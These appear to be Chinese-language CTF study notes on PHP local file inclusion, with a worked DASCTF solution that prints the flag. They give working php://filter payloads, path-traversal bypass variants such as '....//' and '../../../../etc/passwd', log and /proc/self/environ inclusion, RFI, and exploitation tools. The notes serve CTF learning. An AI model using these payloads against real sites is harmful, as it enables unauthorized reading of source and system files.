# Web笔记10-文件包含LFI解题手册

> 来源：DASCTF p 参数题实战 + hc-web/include.md 章节

## 一、题型判断（3 特征）

```
① URL 有文件类参数名：?p= / ?page= / ?file= / ?f= / ?include= / ?path=
② 参数值像文件名，响应 = 某个文件的内容
③ 换参数值输出跟着变
```

## 二、核心概念

- **include($p)** = 把 $p 指向的文件内容"拿进来执行"
- 包含 PHP 文件 → **会执行**（所以 flag.php 里的 die() 会拦截你）
- `php://filter` 伪协议 = 把文件当**文本流**读，不执行 → 看源码的万能招

## 三、标准解题流程

```
第0步 确认：p=不存在文件 → 空；p=hello → 内容
第1步 读源码：p=php://filter/convert.base64-encode/resource=index.php
      → base64 解码 → 看过滤/后缀/flag文件名
第2步 判断坑 → 绕过（见下表）
第3步 读 flag：flag.php / flag.txt / /flag
```

## 四、常见坑 → 绕过对照表

| 坑 | 绕过 |
|---|---|
| 自动加 `.php` 后缀 | `resource=index`（filter 自动拼全） |
| 关键字过滤（flag） | 大小写、`./` 前缀、URL 编码、截断 |
| 文件包含即执行（die/exit） | **base64 filter 读源码**（本题核心） |
| 路径限制 | `../../../../etc/passwd` |
| filter 被禁 | 日志包含 / /proc/self/environ / 临时文件竞争 |
| 远程包含 | RFI：自己服务器放恶意文件 |

## 四点半、`../` 被过滤 → 双写/变体绕过（★实测）

**原理**：WAF 常用 `str_replace('../', '')` 删一次——把 `../` 写成 `....//`，删掉中间的 `../`（从第 2 个点起算）后**还剩一个 `../`**，照样穿越（"删一次还剩一次"）。

| 变体 | 写法 | 说明 |
|---|---|---|
| **双写（最稳）** | `....//` | `str_replace` 删一次还剩 `../` |
| 点斜杠 | `..././` | 删 `../` 后剩 `./` |
| URL 编码 | `..%2f` | 斜杠编码，服务器解码后还原 |
| 双重编码 | `%252e%252e%252f` | 编码两次，WAF 解一层还剩一层 |
| 全编码 | `%2e%2e%2f` | 点和斜杠都编码 |
| 反斜杠 | `..\` | Windows 风格分隔符（Linux 部分场景也认） |

**LFI 判断顺序**：确认能读 → 试 `../` 穿越 → 被拦就**分类过滤类型**（拦 `../`？拦关键字？拦协议？）→ 换对应变体 → 别死磕 filter，能穿越就**直接读文件本体**。

## 五、实战案例（DASCTF p 参数题）

```php
// index.php 源码
if(isset($_GET['p'])) {
    include (string)$_GET['p'] . ".php";   // 自动加后缀
}
```

```php
// flag.php 内容（直接包含会被 die 拦截！）
<?php
die('no no no');
//n1book{afr_1_solved}
```

**解法**：
```
p=Php://filter/convert.base64-encode/resource=./flag
→ base64: PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9
→ 解码 → 注释里有 flag
```

**关键点**：
- "no no no" 不是 WAF，是 flag.php 的 die() 执行结果（先测过滤器行为再下结论！）
- 过滤器若是精确匹配，加 `./` 前缀绕过（路径不变）

## 六、工具

| 工具 | 用途 |
|---|---|
| liffy（GitHub） | LFI 自动利用框架 |
| kadimus | LFI 利用工具 |
| php_filter_chain_generator | 自动生成 filter 链（高级场景） |
| 自建 lfi_helper.py | 读源码+解码+试 flag 文件（推荐） |

## 七、常见坑（做题经验）

- **先分清"过滤器"和"文件自身行为"**：p=flag 出 "no no no"，可能不是过滤，是 flag.php 的 die()
- php://filter 输出是 base64，看到一长串乱码先解码
- 大小写 Php:// 可绕过某些大小写敏感的 filter
- 过滤规则要实测：精确匹配 vs 子串匹配完全不同（xxflagxx 过 = 精确匹配）

---

## 八、include() 机制详解（必懂）

### 真实行为（只有两种结果）

```
include(路径)：
  ① 路径打不开（不存在/协议无效）→ 警告被吞 → 空输出
  ② 路径打得开 → 把【文件内容】当 PHP 代码执行：
     ├─ 内容有 PHP 标签 → 执行 → 输出【执行结果】
     │    hello.php 内容 = <?php echo "hello world!"; ?>
     │    → include("hello.php") → 输出 "hello world!"
     └─ 内容无 PHP 标签（纯文本/base64）→ 原样输出内容
          filter 加工后的 base64 → 无标签 → 原样吐出来
```

### 易错点（我的误解修正）

- ❌ include 会"原样输出参数"
- ✅ include 是"执行器"：拿到路径 → 打开 → 把内容当代码执行
- 永远不会输出参数本身；打不开就空

### 推论（做题核心）

| 情况 | 结果 | 对策 |
|---|---|---|
| 包含 PHP 文件 | 执行（die 拦截/无输出） | **filter+base64 读源码** |
| 包含纯文本文件 | 原样输出 | 直接包含即可 |
| 包含不存在文件 | 空 | 先确认文件名 |

### php://filter 语法解剖（一句话三件套）

```
php://filter / convert.base64-encode / resource=目标文件
│     │        │                         │
│     │        │                         └ resource=文件（读谁）
│     │        └ 过滤器（对内容加工，base64=消磁）
│     └ 通道名 filter（"带过滤的读取"）
└ 伪协议家族（php:// 下固定几个通道：filter/input/output/memory/temp/data）
```

- `php://resource=xxx`、`php://index.php` 等 = 通道不存在 → 失败（不是合法句法）
- 去掉 base64 过滤器 = 读到原始代码 → 又被执行 → 白读（实验验证过）
- **base64 的作用 = "消磁"**：把会执行的 PHP 代码变成无害文本，include 只能原样吐

### include+filter 是常见套路吗？—— 是，LFI 题第一招

- 文件包含题 90% 的第一步 = php://filter 读 index.php 源码
- 教材 include.md 整章核心就是它
- 变体：换过滤器（rot13/string.rot13）、多层 filter、读日志等

---

## 九、完整输出链路演示（DASCTF 实战实录）

```
我们的输入：p = php://filter/convert.base64-encode/resource=flag

代码拼接：include("php://filter/convert.base64-encode/resource=flag" . ".php")
         = include("php://filter/convert.base64-encode/resource=flag.php")
              ↑ .php 后缀加在整个字符串末尾 → resource 从 flag 变成 flag.php

filter 动作：打开 flag.php → 内容 base64 编码
         → "PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9"

include 拿到 base64 文本（无 PHP 标签）→ 原样输出

输出 = PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9

我们解码 → <?php die('no no no'); //n1book{afr_1_solved}
```

### 链路中的三个关键点

1. **`.php` 后缀加在整个字符串末尾** → `resource=flag` 自动变成 `resource=flag.php`（不用自己写 .php）
2. **filter 先编码，include 后接收** → include 永远只看到无害的 base64 文本，不会触发 die() 执行
3. **输出 = base64 串** → 拿到手自己解码，flag 在解码后的注释里

### include 最终认知（记忆版）

- **参数** = 路径说明书 → 被【打开】（不执行）
- **内容** = 打开后拿到的数据 → 有 PHP 标签就【执行】，没标签就【原样输出】
- 打不开 → 空（警告被吞）
- 执行的是"内容"，不是"参数"


